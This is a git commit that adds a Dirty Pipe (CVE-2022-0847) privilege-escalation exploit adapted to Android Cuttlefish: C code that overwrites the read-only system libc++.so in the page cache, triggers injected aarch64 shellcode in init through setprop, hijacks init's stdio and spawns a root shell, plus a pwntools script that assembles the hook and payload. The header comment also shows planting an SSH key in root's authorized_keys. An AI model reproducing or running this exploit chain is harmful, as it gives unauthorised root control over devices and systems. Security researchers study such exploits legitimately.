27af65041bd2292c3767310af8a9f50f3b29e98f
Jack Roscoe <jack.x.roscoe@gmail.com>
2025-07-16 16:20:32 -0500

    infinite loop in init process

---
+++ cuttlefish_dirtypipe/dirtypipe.c
@@ -0,0 +1,250 @@
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stddef.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/syscall.h>
+#include <pthread.h>
+#include <errno.h>
+#include <sys/prctl.h>
+
+#include "dirtypipe.h"
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+__attribute__((noreturn))
+void panic(const char *msg) {
+	fprintf(stderr, "%s", msg);
+	exit(1);
+}
+
+#define LOG(fmt, ...) do { \
+  printf(fmt "\n", ##__VA_ARGS__); \
+  } while(0)
+
+#define FAIL() do { LOG("Failed on %s:%d\n", __func__, __LINE__); exit(1); } while(0)
+
+#define SYSCHK(x) ({                  \
+  __typeof__(x) __res = (x);          \
+  if (__res == (__typeof__(x))-1) {   \
+    LOG("SYSCHK(" #x ") = %d\n", __res);\
+    int error_val = errno;            \
+    LOG("errno: %d\n", error_val);    \
+    exit(1);                          \
+  }                                   \
+  __res;                              \
+})
+
+
+/**
+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
+{
+	if (pipe(p)) abort();
+
+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+	static char buffer[4096];
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		write(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		read(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its "flags", the buffer
+	   will be mergeable */
+}
+
+// uses the dirtypipe exploit to write to a file
+static void write_file(int fd, loff_t offset, unsigned char *data, size_t data_size) {
+	if (offset % PAGE_SIZE == 0) {
+		panic("Sorry, cannot start writing at a page boundary\n");
+	}
+
+	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
+	const loff_t end_offset = offset + (loff_t)data_size;
+	if (end_offset > next_page) {
+		panic("Sorry, cannot write across a page boundary\n");
+	}
+
+	struct stat st;
+	if (fstat(fd, &st)) {
+		perror("stat failed");
+		exit(1);
+	}
+
+	if (offset > st.st_size) {
+		panic( "Offset is not inside the file\n");
+	}
+
+	if (end_offset > st.st_size) {
+		panic("Sorry, cannot enlarge the file\n");
+	}
+
+	/* create the pipe with all flags initialized with
+	   PIPE_BUF_FLAG_CAN_MERGE */
+	int p[2];
+	prepare_pipe(p);
+
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0) {
+		perror("splice failed");
+		exit(1);
+	}
+	if (nbytes == 0) {
+		panic("short splice\n");
+	}
+
+	/* the following write will not create a new pipe_buffer, but
+	   will instead write into the page cache, because of the
+	   PIPE_BUF_FLAG_CAN_MERGE flag */
+	nbytes = write(p[1], data, data_size);
+	if (nbytes < 0) {
+		perror("write failed");
+		exit(1);
+	}
+	if ((size_t)nbytes < data_size) {
+		panic("short write\n");
+	}
+}
+
+void root_shell();
+
+#include <dlfcn.h>
+// Adapted from: https://stackoverflow.com/questions/28413530/api-to-get-android-system-properties-is-removed-in-arm64-platforms
+typedef int (*fn__system_property_get)(const char *, char *);
+int __system_property_get(const char *name, char *value) {
+    static fn__system_property_get __real_system_property_get = NULL;
+    if (!__real_system_property_get) {
+        // libc.so should already be open, get a handle to it.
+        void *handle = dlopen("libc.so", RTLD_NOLOAD);
+        if (!handle) {
+            LOG("Cannot dlopen libc.so: %s.\n", dlerror());
+        } else {
+            __real_system_property_get = (fn__system_property_get)dlsym(handle, "__system_property_get");
+        }
+        if (!__real_system_property_get) {
+            LOG("Cannot resolve __system_property_get(): %s.\n", dlerror());
+        }
+    }
+    if (!__real_system_property_get) return (0);
+    return (*__real_system_property_get)(name, value);
+}
+
+int main(int argc, char **argv) {
+	if (argc == 2 && strcmp(argv[1], "shell") == 0) {
+		root_shell();
+		return 0;
+	}
+
+	int pid = getpid();
+	FILE *fp = fopen("/data/local/tmp/pid", "w");
+	fwrite(&pid, sizeof(pid), 1, fp);
+	fclose(fp);
+
+	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
+	write_file(fd, PAYLOAD_ADDR, PAYLOAD, sizeof(PAYLOAD));
+	write_file(fd, HOOK_ADDR, JMP_SHIM, sizeof(JMP_SHIM));
+	puts("libc++.so overwritten");
+
+	char model[0x100] = { 0 };
+	//__system_property_get("ro.product.model", model);
+	system("setprop a a");
+	puts("setprop trigger");
+
+	while (access("/data/local/tmp/root_done", F_OK) != 0) {}
+	puts("root_done file found");
+	SYSCHK(unlink("/data/local/tmp/root_done"));
+
+	return 0;
+}
+
+// #define SYS_pidfd_getfd 438
+char buf[0x100];
+char path[0x100];
+int res;
+int fd;
+int port;
+char* ip;
+void root_shell() {
+	int fd = SYSCHK(open("/system/lib64/libc++.so", O_RDONLY));
+	write_file(fd, HOOK_ADDR, ORIGINAL_HOOK_CODE, sizeof(ORIGINAL_HOOK_CODE));
+	close(fd);
+
+	int pid = 0;
+
+	FILE* fp = fopen("/data/local/tmp/pid", "r");
+	fread(&pid, sizeof(pid), 1, fp);
+	fclose(fp);
+
+	int pfd = syscall(SYS_pidfd_open, pid, 0);
+	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
+	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
+	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
+	dup2(stdinfd, 0);
+	dup2(stdoutfd, 1);
+	dup2(stderrfd, 2);
+
+	fp = fopen("/data/local/tmp/root_done", "w");
+	char *s = "OK";
+	fwrite(s, 1, strlen(s), fp);
+	fclose(fp);
+
+	execlp("/bin/sh","/bin/sh",NULL);
+}
---
+++ cuttlefish_dirtypipe/gen_constants.py
@@ -0,0 +1,184 @@
+from pwn import *
+
+context.arch = 'aarch64'
+
+libcpp = ELF('android_libc++.so')
+streambuff_ctor = libcpp.symbols[b'_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev']
+
+UNUSED_CODE_START = 0xa3bd0
+UNUSED_CODE_END = 0xa4000
+
+TEXT_SEGMENT_OFFSET = 0xd0
+
+def bytes_to_c_array(data: bytes) -> str:
+    return '{' + ', '.join(str(n) for n in data) + '}'
+
+def load_reg_64(reg: str, value: int) -> str:
+    return f'''
+movz {reg}, {value & 0xffff}, lsl #0
+movk {reg}, {(value & 0xffff0000) >> 16}, lsl #16
+movk {reg}, {(value & 0xffff00000000) >> 32}, lsl #32
+movk {reg}, {(value & 0xffff000000000000) >> 48}, lsl #48
+'''
+
+def push_str_on_stack(data_str: str) -> str:
+    data = data_str.encode() + b'\0'
+    pad_len = 16 - (len(data) % 16)
+    data = data.ljust(len(data) + pad_len, b'\0')
+
+    out = ''
+    for i in range(0, len(data), 16):
+        n1 = u64(data[i:i+8])
+        n2 = u64(data[i+8:i+16])
+
+        out = f'''
+sub sp, sp, #16
+{load_reg_64('x0', n1)}
+str x0, [sp, #0]
+{load_reg_64('x0', n2)}
+str x0, [sp, #8]
+''' + out
+    
+    return out
+
+def main():
+    jmp_shim = asm(f'b {UNUSED_CODE_START - streambuff_ctor}', vma = streambuff_ctor)
+    assert len(jmp_shim) == 4
+    old_instr_bytes = libcpp.read(streambuff_ctor, 4)
+
+    payload = f'''
+    // Allocate space: 8 registers x 8 bytes = 64 bytes
+    sub sp, sp, #64
+
+    // Store registers to stack
+    stp x0, x1, [sp, #0]
+    stp x2, x3, [sp, #16]
+    stp x4, x5, [sp, #32]
+    stp x6, x7, [sp, #48]
+    mov x7, sp
+
+    // getpid syscall
+    mov x8, #172          // syscall number for getpid
+    svc #0
+    cmp x0, #1            // is PID == 1?
+    b.ne exit             // if not, exit
+
+    // getresuid syscall
+    //sub sp, sp, #32
+    //add x0, sp, #0
+    //add x1, sp, #8
+    //add x2, sp, #16
+    //mov x8, #148
+    //svc #0
+
+    //ldr x0, [sp, #0]
+    //ldr x1, [sp, #8]
+    //ldr x2, [sp, #16]
+    //cmp x0, #0
+    //b.eq go
+    //cmp x1, #0
+    //b.eq go
+    //cmp x2, #0
+    //b.eq go
+
+    //b #0x69690
+
+    // Set up arguments for clone()
+    // x86_64
+    // long clone(unsigned long flags, void *child_stack,
+    //            int *parent_tid, int *child_tid, unsigned long tls)
+    //
+    // aarch64
+    // long clone(unsigned long flags, void *child_stack,
+    //            int *parent_tid, unsigned long tls, int *child_tid)
+    //
+
+    mov x0, #0            // flags = SIGCHLD (to make clone act like fork)
+    mov x1, #0            // child_stack = NULL (kernel allocates it)
+    mov x2, #0            // ptid = NULL
+    mov x3, #0            // ctid = NULL
+    mov x4, #0            // newtls = 0
+    mov x8, #220          // syscall number for clone
+    svc #0                // make syscall
+    cmp x0, #0
+    b.lt exit             // error
+    b.gt exit             // parent process exits
+
+    // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
+
+//go:
+
+loop:
+    b loop
+
+    {push_str_on_stack('/data/local/tmp/dirtypipe')}
+    mov x6, sp
+
+    {push_str_on_stack('shell')}
+    mov x5, sp
+
+    sub sp, sp, #32
+    str x6, [sp, #0]
+    str x5, [sp, #8]
+    str xzr, [sp, #16]
+
+    // argv
+    mov x1, sp
+
+    // filename
+    mov x0, x6
+
+    mov x2, xzr           // envp = NULL
+
+    mov x8, #221          // syscall number for execve
+    svc #0
+
+exit:
+    mov sp, x7
+
+    ldp x0, x1, [sp, #0]
+    ldp x2, x3, [sp, #16]
+    ldp x4, x5, [sp, #32]
+    ldp x6, x7, [sp, #48]
+
+    // Free stack space
+    add sp, sp, #64
+    '''
+
+    print(payload)
+
+    payload = asm(payload, vma = UNUSED_CODE_START) + old_instr_bytes
+
+    return_jmp_location = UNUSED_CODE_START + len(payload)
+    return_jmp = asm(f'b {streambuff_ctor + 4 - return_jmp_location}', vma = return_jmp_location)
+    payload = payload + return_jmp
+
+    assert len(payload) < UNUSED_CODE_END - UNUSED_CODE_START
+
+    new_text_size = 0x5b000
+
+    header_file = f'''
+#ifndef DIRTYPIPE_H
+#define DIRTYPIPE_H
+
+#include <stddef.h>
+
+size_t HOOK_ADDR = {hex(streambuff_ctor)};
+unsigned char JMP_SHIM[] = {bytes_to_c_array(jmp_shim)};
+unsigned char ORIGINAL_HOOK_CODE[] = {bytes_to_c_array(old_instr_bytes)};
+
+size_t PAYLOAD_ADDR = {hex(UNUSED_CODE_START)};
+unsigned char PAYLOAD[] = {bytes_to_c_array(payload)};
+
+// just for testing
+size_t TEXT_SEGMENT_OFFSET = {hex(TEXT_SEGMENT_OFFSET)};
+unsigned char TEXT_SEGMENT_PAYLOAD[] = {bytes_to_c_array(p64(new_text_size) + p64(new_text_size))};
+
+#endif
+'''
+
+    with open('dirtypipe.h', 'w') as f:
+        f.write(header_file)
+
+if __name__ == '__main__':
+    main()
